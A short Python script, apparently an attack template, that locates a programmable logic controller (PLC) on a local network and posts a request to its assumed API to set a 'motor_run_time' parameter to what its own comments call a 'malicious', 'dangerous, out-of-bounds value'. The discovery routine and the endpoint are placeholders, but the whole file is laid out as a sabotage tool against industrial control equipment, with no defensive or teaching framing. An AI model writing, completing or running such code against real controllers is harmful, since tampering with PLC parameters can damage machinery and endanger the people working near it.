import requests
import socket
import re

# Function to discover the PLC's IP address on the network using ARP or a simple scan
def discover_plc_ip():
    # This is a placeholder for a real discovery mechanism
    # In a real scenario, you might use ARP scanning or other network discovery tools
    print("Discovering PLC IP address...")
    # Example: Simulate finding the PLC's IP (replace with actual logic)
    plc_ip = "192.168.1.100"  # Replace with actual IP
    print(f"Found PLC at IP: {plc_ip}")
    return plc_ip

# Function to modify a critical parameter on the PLC
def modify_plc_parameter(plc_ip, parameter_name, new_value):
    # Simulate modifying a parameter via an API or direct communication
    print(f"Modifying parameter '{parameter_name}' on PLC at {plc_ip} to {new_value}...")
    
    # Example: Simulate sending a request to the PLC's API
    url = f"http://{plc_ip}/api/modify_parameter"  # Replace with actual API endpoint
    payload = {
        "parameter": parameter_name,
        "value": new_value
    }
    
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f"Successfully modified parameter '{parameter_name}' to {new_value}.")
        else:
            print(f"Failed to modify parameter. Response code: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Main script
if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    
    # Step 2: Define the parameter and the new malicious value
    parameter_name = "motor_run_time"  # Example parameter
    new_value = 999  # Dangerous, out-of-bounds value
    
    # Step 3: Modify the parameter on the PLC
    modify_plc_parameter(plc_ip, parameter_name, new_value)